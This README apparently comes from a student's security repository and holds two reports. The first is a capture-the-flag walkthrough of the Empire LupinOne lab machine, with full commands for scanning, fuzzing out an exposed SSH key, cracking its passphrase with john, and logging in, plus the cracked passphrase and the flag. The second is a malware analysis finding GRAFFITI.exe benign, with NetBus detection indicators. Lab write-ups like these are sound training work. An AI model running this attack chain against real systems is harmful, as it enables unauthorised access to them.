

##  Repository Structure

```
Empire-LupinOne-Pentest/
├── README.md                     # this file — project overview & structure
├── Empire-LupinOne-Report.pdf    # full penetration test report (PDF)
└── images/                       # screenshots referenced by the report
    ├── 01-target-vm-network.png      # target VM — host-only network config
    ├── 02-kali-vm-network.png        # attacker VM — host-only network config
    ├── 04-netdiscover.png            # host discovery
    ├── 05-nmap-quick.png             # initial nmap scan (22, 80)
    ├── 06-nmap-full.png              # full nmap -sV -sS -sC
    ├── 07-web-root.png               # web root page
    ├── 08-robots-txt.png             # robots.txt (Disallow /~myfiles)
    ├── 09-myfiles-404.png            # /~myfiles decoy (404)
    ├── 10-ffuf-dirs-setup.png        # ffuf directory fuzzing
    ├── 11-ffuf-secret-found.png      # /~secret/ discovered
    ├── 12-secret-directory.png       # note inside /~secret/
    ├── 13-ffuf-files-setup.png       # ffuf hidden-file fuzzing
    ├── 14-ffuf-mysecret-found.png    # .mysecret.txt discovered
    ├── 15-base58-blob.png            # encoded blob
    ├── 16-base58-decoded-key.png     # Base58 → OpenSSH key
    ├── 17-ssh2john.png               # ssh2john conversion
    ├── 19-john-permission.png        # john re-run with sudo
    ├── 20-john-cracked.png           # passphrase cracked
    ├── 21-ssh-key-attempt.png        # SSH key login attempt
    ├── 22-ssh-success.png            # successful SSH login (icex64)
    └── 24-user-flag.png              # user.txt captured
```

--

---

## 🎯 Target

| | |
|---|---|
| Host | `<target ip>` |
| OS | Debian 11 (Linux 5.10) |
| Difficulty | Medium |
| Services | `22/tcp` OpenSSH 8.4p1 · `80/tcp` Apache 2.4.48 |

---

##  Attack Chain at a Glance

```
netdiscover / nmap
        │  22 (ssh), 80 (http)
        ▼
robots.txt → /~myfiles (404 decoy)
        │
        ▼
ffuf  /~FUZZ           →  /~secret/  (301)
        │
        ▼
ffuf  /~secret/.FUZZ   →  .mysecret.txt  (hidden dot-file)
        │
        ▼
Base58 decode          →  OpenSSH private key (id_rsa)
        │
        ▼
ssh2john + john (fasttrack.txt)  →  passphrase: P@55w0rd!
        │
        ▼
chmod 600 + ssh -i id_rsa icex64@<target ip>   →  shell as icex64
        │
        ▼
      user.txt   captured
```

---

##  Key Takeaways

- **A private key was exposed over HTTP** — encoding (Base58) is not protection.
- **The passphrase was weak** (`fasttrack.txt`-crackable in ~1s).
- **`robots.txt` and naming conventions leaked structure**, and even a decoy narrowed the search.
- The compromise required *every* weak link — fixing any one breaks the chain.

---

##  Full Command Walkthrough

Every command used in the engagement, with inline comments. Replace `<target ip>`
with the machine's actual address on your lab network.

### 1 · Reconnaissance

```bash
# Discover live hosts on the local (host-only) segment via ARP.
# Reveals the target's IP without touching it noisily.
sudo netdiscover

# Quick default TCP scan — which ports are open?
# Result here: 22/tcp (ssh) and 80/tcp (http).
nmap <target ip>

# Deep scan of the two known ports:
#   -sS  SYN (stealth) scan
#   -sV  service/version detection (OpenSSH 8.4p1, Apache 2.4.48)
#   -sC  default NSE scripts (pulls http-robots.txt -> /~myfiles)
nmap -sV -sS -sC <target ip>
```

### 2 · Web Enumeration

```bash
# Read the robots.txt hinted at by nmap.
# It disallows /~myfiles ... which turns out to be a 404 decoy.
curl http://<target ip>/robots.txt

# The '~' prefix screams Apache userdir. Fuzz for real userdir names.
#   -w   wordlist
#   -c   colourised output
#   -ic  ignore wordlist comment lines
#   -fc 403   filter out 403 responses (noise)
# -> finds "secret" (HTTP 301), i.e. /~secret/
ffuf -u http://<target ip>/~FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403

# View the /~secret/ page — it contains a note from "icex64" saying an
# SSH private key is HIDDEN in this directory and the passphrase is
# crackable with "fasttrack". Two big hints in one message.
curl http://<target ip>/~secret/

# Fuzz again, this time for HIDDEN files (leading dot) inside /~secret/:
#   -e .txt,.html   also try these extensions on each word
# -> finds .mysecret.txt (HTTP 200, size 4689)
ffuf -u http://<target ip>/~secret/.FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403 \
     -e .txt,.html
```

### 3 · Credential Access (recover & crack the SSH key)

```bash
# Grab the hidden file. It's ONE long high-entropy line — an encoded blob,
# not a raw key. Character set (no 0/O/I/l) => Base58.
curl http://<target ip>/~secret/.mysecret.txt

# Base58-decode the blob to recover the OpenSSH private key.
# (Done via an online Base58 decoder, or the CLI below.)
# Save the decoded output as id_rsa.
curl -s http://<target ip>/~secret/.mysecret.txt | base58 -d > id_rsa
#   ^ if the 'base58' tool isn't installed:  pip install base58   (or use an online decoder)

# The key is passphrase-protected. Convert it to a John-crackable hash.
ssh2john id_rsa > hash.txt

# Crack the passphrase using the author-hinted 'fasttrack' wordlist.
# (First run without sudo may hit "Permission denied" on the wordlist path —
#  re-run with sudo as shown.)
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
#   -> recovered passphrase:  P@55w0rd!

# (Optional) redisplay the cracked passphrase later:
john --show hash.txt
```

### 4 · Initial Access (SSH foothold)

```bash
# SSH rejects world-readable private keys with "bad permissions".
# Lock the key down to owner-read/write only.
chmod 600 id_rsa

# Log in with the recovered key as icex64 (username came from the note).
# When prompted for the key passphrase, enter:  P@55w0rd!
ssh -i id_rsa icex64@<target ip>
```

### 5 · User Flag

```bash
# Now on the box as icex64 — read the user flag from the home directory.
cat user.txt
#   -> 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

---

## Tools Used

`netdiscover` · `nmap` · `ffuf` · `ssh2john` · `john` · Base58 decoder · `ssh`

---

##  Findings Summary

| # | Finding | Severity |
|---|---|---|
| F-01 | SSH private key exposed on the public web server | Critical |
| F-02 | Weak passphrase on the SSH private key | High |
| F-03 | Sensitive content hidden by obscurity only | Medium |
| F-04 | Information disclosure via robots.txt / naming | Low |
| F-05 | Verbose service / version banners | Informational |

---

##  part 2
# Malware Analysis Report — `GRAFFITI.exe`

**Analyst:** Kenil
**Date:** 2026-07-21
**Sample source:** University coursework (folder `b/`, supplied for analysis)
**Analysis type:** Static triage + advanced payload recovery + behavioural plan
**Environment:** Isolated Linux sandbox — the sample was **never executed**

> **Note on this revision.** An initial triage flagged this as a *likely NetBus trojan
> dropper* based on circumstantial signals (a bundled NetBus manual, dropper-like imports,
> and a `12345` string). **Advanced analysis — recovering and identifying every embedded
> component — reversed that conclusion.** The corrected findings are below; the reasoning for
> the reversal is documented so the analytic process is transparent.

---

## 1. Executive summary

`GRAFFITI.exe` is a **benign self-extracting electronic greeting card**. It is a small 32-bit
"grafPrf" player stub with an appended archive; when run it displays the lure
*"Opening your greeting, Please wait…"* and unpacks a **legitimate American Greetings
"Graffiti" e-card** built in **Macromedia Director 4.0.4 (1994)**, together with that era's
standard Director runtime components.

Every embedded byte was recovered and identified. **No NetBus payload — or any RAT — exists
inside `GRAFFITI.exe`.** The archive is accounted for byte-for-byte by three clean, identifiable
Director files; the 176 KB stub is far too small to hold the ~470 KB NetBus server; the stub has
no networking APIs to fetch one; and none of the components contain NetBus/`Patch.exe`/`KeyHook`/
`ServerPwd` strings or a registry `Run` persistence path.

The NetBus association comes **entirely from sibling files in the `b/` folder**, not from the
greeting card: `NetBus.rtf` (the RAT's user manual) and empty `Hosts.txt` / `Memo.txt`
(NetBus **client** artefacts). The folder therefore reads like a **forensic evidence set** — an
innocuous greeting card sitting alongside genuine NetBus *attacker* tooling.

**Verdict:** `GRAFFITI.exe` — **BENIGN** (American Greetings / Macromedia Director e-card,
self-extracting). *Not* a NetBus dropper. The NetBus tooling in the folder is separate and does
not indicate the greeting card is trojanised.

**Analytic lesson:** guilt-by-association (a NetBus manual sitting next to the file) did not
survive verification. Classification required actually recovering the payload and confirming a
RAT was present — it was not.

---

## 2. File identification & hashes

**Container**

| Property | Value |
|---|---|
| File name | `GRAFFITI.exe` |
| Size | 1,306,241 bytes |
| Type | PE32 (GUI, i386) **+ appended ZIP overlay** (self-extracting) |
| MD5 | `037356668c6da7e6a0fcc305db97e6ff` |
| SHA-1 | `6d021798a3f4fc2406cbd3a02d1e8363ce62ed31` |
| SHA-256 | `09c00ae65e75bc01cd018a27d718d39a4e9237bda8cbaf1fb37b1f251910e6e1` |
| Compile timestamp | 2000-01-20 11:12:01 UTC |
| Linker | MSVC 6.0 |

**Recovered embedded files (carved from `card.lng`)**

| File | Size | MD5 | Identity |
|---|---|---|---|
| `fileio.dll` | 12,832 | `9f179cdc8d4c52c1b40514a53a1cc534` | Director **FileIO Xtra** (16-bit NE) |
| `GREETING.EXE` | 1,531,622 | `15c00aad1aa877239506355b0657dde7` | **Director 4.0.4 projector** (the e-card, 16-bit NE) |
| `LINGO.INI` | 67 | `9b538f26347a27c1f9ae3a7f2ab31744` | Director startup script (loads FileIO Xtra) |
| `card.lng` | 1,544,728 | `a3ec3bd60ddf969debb930225256a71d` | `grafPrf` container holding the three files above |

**Sibling files in `b/` (NOT part of the greeting card)**

- `NetBus.rtf` (22,729 B) — the genuine **NetBus v1.70** manual (©1998, Carl-Fredrik Neikter).
- `Hosts.txt` (0 B), `Memo.txt` (0 B) — filenames used by the **NetBus client** for saved host
  lists / notes. Empty here.

---

## 3. Structure — fully resolved

```
GRAFFITI.exe                         PE32 "grafPrf" player stub (~176 KB, NOT packed)
  └── [ZIP overlay @ 0x2B008]
        └── card.lng (1.54 MB)       "grafPrf" container
              ├── [manifest + 126-byte greeting message]   ~207 bytes
              ├── fileio.dll   @0x000CF  (12,832 B)   Director FileIO Xtra (NE)
              ├── GREETING.EXE @0x032EF  (1,531,622 B) Director 4.0.4 projector (NE)
              │     ├── GRAF472a         the Graffiti projector code
              │     ├── DIB module       Director device-independent-bitmap DLL
              │     ├── MACROMIX module  Director 4.0.4 sound mixer
              │     └── XFIR movie(s)    the "GRAFFITI.DIR" Director cast/media
              └── LINGO.INI   @0x1791D5 (67 B)        startup script
                                                       (ends exactly at EOF ✓)
```

Key structural facts:

- The PE starts with a valid `MZ`, has 4 sections, **none high-entropy** (`.text` 6.59, `.rdata`
  4.58, `.data` 4.68, `.rsrc` 3.62) → the stub is **not packed/crypted**. Bytes after the last
  section (offset 176,128 onward, 1,130,113 B) are a ZIP overlay containing a single member,
  `card.lng`.
- `card.lng` is a `grafPrf` container: magic `grafPrf`, a file table
  (`fileio.dll`/12832, `GREETING.EXE`/1531622, `LINGO.INI`/67), a 126-byte greeting message
  (*"Your dearest friend. When the going ge…"*), then the three files stored **raw and
  concatenated**. The offset math lands exactly on EOF — **the archive is 100% accounted for,
  leaving no room for a hidden payload.**
- `PK` byte-matches inside the PE and extra `MZ` matches are **coincidental** — inside the
  extractor's x86 code and inside the Director projector's embedded runtime DLLs, respectively.

---

## 4. Component identification (advanced payload recovery)

Each embedded file was carved at its computed offset and identified:

- **`GREETING.EXE` — American Greetings "Graffiti" e-card, Macromedia Director 4.0.4.**
  Its own embedded source path is decisive:
  `D:\AG\AGONLINE\AG#3\GRAFFITI.DIR` followed by the Director movie signature `XFIR`
  (`AG`/`AGONLINE` = American Greetings Online). The projector carries standard Director strings:
  *"Macromedia Director 4.0.4"*, *"Copyright 1985-1994 Macromedia"*, *"Projector Application"*,
  *"MacroMix sound mixer 4.0.4"*, *"ASIPort.DLL … Copyright 1991 Altura Software"*,
  *"OPTLOADER … Copyright 1993 SLR Systems"*. It embeds two standard runtime DLLs by module
  name: **`DIB`** (bitmap graphics) and **`MACROMIX`** (audio) — components every Director 4
  projector bundles.
- **`fileio.dll` — Director FileIO Xtra** (16-bit NE). The standard library that gives Lingo
  scripts file access.
- **`LINGO.INI`** (complete): `-- / on startup / openxlib (the pathname & "fileio") / end startup`.
  Benign boilerplate that loads the FileIO Xtra at startup. No drop/exec logic.

---

## 5. Behavioural profile of the stub (static)

Imports indicate a self-extractor/player: `GetTempPathA`, `CreateFileA`, `WriteFile`,
`CreateDirectoryA`, `ReadFile`, `DeleteFileA`, `FindFirstFileA/FindNextFileA` (file I/O);
`RegCreateKeyExA`/`RegSetValueExA`/`RegOpenKeyExA`/`RegCloseKey` (registry);
`WritePrivateProfileStringA` (writes `LINGO.INI`); `ShellExecuteExA` (launches the card);
dialog/GDI calls (the greeting window). Lure string: **`Opening your greeting, Please wait...`**;
working files `\card.lng` / `\card.zip` / `\card.zzz`.

Interpretation: the stub extracts `card.lng`, unpacks the three Director files, writes
INI/registry **settings**, and `ShellExecute`s the greeting card. Notably:

- **No networking APIs** in the stub (no WinSock/WinINet) → it cannot beacon or download.
- **No registry `Run` / persistence path** appears as a string (`RegOpenKeyExA` and settings
  writes only) → consistent with a player storing its own configuration, not installing autorun
  persistence.
- The only executable it launches is the **clean greeting card** (no other PE/NE exists to run).

*(Recommended to fully pin down: disassemble the exact `RegSetValueExA` target subkey/value to
confirm it is player configuration. No persistence string was found, so this is a completeness
step, not an open suspicion.)*

---

## 6. Indicator verification — why the preliminary "NetBus" signals were false

| Preliminary signal | Verdict after analysis |
|---|---|
| Bundled `NetBus.rtf` (RAT manual) | **Sibling file**, not inside the card. Documents NetBus generally; not evidence the card is trojanised. |
| `Hosts.txt` / `Memo.txt` present | NetBus **client** artefacts (attacker side), empty; sibling files, not produced by the card. |
| Dropper-like imports (`ShellExecuteExA`, reg writes) | Normal for a self-extracting **player** that unpacks and launches a Director card and stores settings. |
| `12345` string ("NetBus port") | **False positive** — it is `123456789` (next to "bigGraffiti"/"game") and a UTF-16 `0-9` glyph list. Not a port. |
| `\Run` / `SHELL` / `SYSTEM` / `delete` / `mReadFile` | **Lingo keyword table + font/system references** embedded in every Director projector — not active operations. |
| `URL` matches | Case-insensitive substrings inside other words; **no actual URLs, no network Lingo**. |

Absent from **all** components: `netbus`, `patch.exe`, `keyhook`, `serverpwd`, a real registry
`Run` path, and any second embedded RAT executable.

---

## 7. Lingo / movie analysis

The Director movie (`XFIR`) was located inside `GREETING.EXE` and scanned for malicious Lingo:

- The only plaintext `on <handler>` blocks visible are **empty runtime templates** belonging to
  the Director engine (immediately followed by debug strings like *"Loaded cast %12p"*), not the
  card's scripts.
- Dangerous-verb scan across the movie region: **zero** hits for `shellExecute`, `winExec`,
  `command.com`, `cmd.exe`, `regedit`, `.reg`, `\windows\`, `system32`, `createFile`,
  `writeString`, `gotoNetPage`, `downloadNetThing`, or `netDone`.
- Director 4 (1994) predates network Lingo, so the movie has essentially no download/exfil
  capability.

**Limitation:** the movie's Lingo is stored compiled in the cast; it was not decompiled (that
needs a Director-specific tool such as **ProjectorRays**). However, even compiled Lingo stores
string **literals** as plaintext in the cast — and no suspicious literal (a payload name, a Run
key, `command.com`, a URL) exists. Combined with the absence of any RAT binary to launch, the
residual risk is negligible.

---

## 8. Forensic interpretation of the `b/` folder

The folder pairs an innocuous greeting card with genuine NetBus tooling. Two consistent readings
(the assignment context would decide which):

1. **Evidence set** — the greeting card is unrelated/decoy; the actual evidence is that the
   system's user possessed NetBus (manual + client host/memo files), i.e. was a NetBus *operator*
   or had the client installed.
2. **Analytic red-herring** — the exercise tests whether the analyst resists guilt-by-association
   and correctly determines, by recovering the payload, that the greeting card is **clean**.

Either way, the evidence-based finding is the same: **`GRAFFITI.exe` is a benign greeting card;
the NetBus artefacts are separate.**

---

## 9. Reference — NetBus (from the bundled `NetBus.rtf`, for context only)

For completeness (this describes the *sibling* tooling, not the greeting card): NetBus v1.70 is a
Windows RAT whose server (`Patch.exe`) auto-starts each session via
`HKLM\...\CurrentVersion\Run`, hides itself, and listens on **TCP 12345** (responds on **12346**)
for keylogging, screen capture, file access, and remote command execution. Switches: `/noadd`,
`/remove`, `/pass:xxx`, `/port:xxx`. Password stored in cleartext at
`HKCU\Patch\Settings\ServerPwd`; keylogger DLL `KeyHook.dll`; auth-bypass backdoor
(`Password;1;<any>`); ref **CAN-1999-0660**. If NetBus itself were found on a host, these are the
IOCs to hunt — but **none of them apply to `GRAFFITI.exe`.**

---

## 10. Indicators (for the greeting card itself)

Since the card is benign, these are **identification** markers, not compromise indicators:

- `GRAFFITI.exe` SHA-256 `09c00ae65e75bc01cd018a27d718d39a4e9237bda8cbaf1fb37b1f251910e6e1`
- `card.lng` SHA-256 `6ec98e5d01a4dbc09d7b56b705cc172a9dbaa8e547bed243b7428a73a87ebce5`
- Container magic string `grafPrf`; working files `card.lng` / `card.zip` / `card.zzz`
- Lure string `Opening your greeting, Please wait...`
- Embedded source path `D:\AG\AGONLINE\AG#3\GRAFFITI.DIR` (American Greetings attribution)

---

## 11. Recommendations

- **Classification:** treat `GRAFFITI.exe` as a benign legacy greeting-card application. It will
  not run natively on modern 64-bit Windows (16-bit Director projector).
- **If the `b/` folder is real evidence:** the investigative focus belongs on the NetBus
  *tooling* (manual + client artefacts) and the host it came from — hunt the NetBus IOCs in
  Section 9 (port 12345/12346, `HKCU\Patch\Settings*`, `KeyHook.dll`), not the greeting card.
- **To reach 100% certainty on the card:** (a) decompile the movie's Lingo with ProjectorRays;
  (b) detonate `GRAFFITI.exe` in an isolated Win9x/2000 VM with Procmon/Regshot/Wireshark and
  confirm it only writes player settings and shows the card — predicted clean.

---

## Appendix A — Analysis limitations

1. Static analysis only; the sample was **not executed**.
2. The Director movie's Lingo is compiled in the cast and was **not decompiled** — though no
   suspicious string literals exist and no RAT binary is present to launch.
3. The stub's exact `RegSetValueExA` target was not disassembled to the instruction level; no
   persistence (`Run`-key) string was found, so it is assessed as player configuration.

## Appendix B — Correction log

- **Initial triage:** "NetBus trojan dropper — strongly indicated" (based on the bundled manual,
  dropper-like imports, and a `12345` string).
- **After advanced payload recovery:** **reversed** to **benign greeting card**. The archive was
  fully accounted for by three clean Director files (American Greetings / Director 4.0.4), the
  `12345` signal was a false positive, no RAT binary or network/exec capability exists, and the
  NetBus association is limited to unrelated sibling files.
---

*Author: Kenil · Lab environment
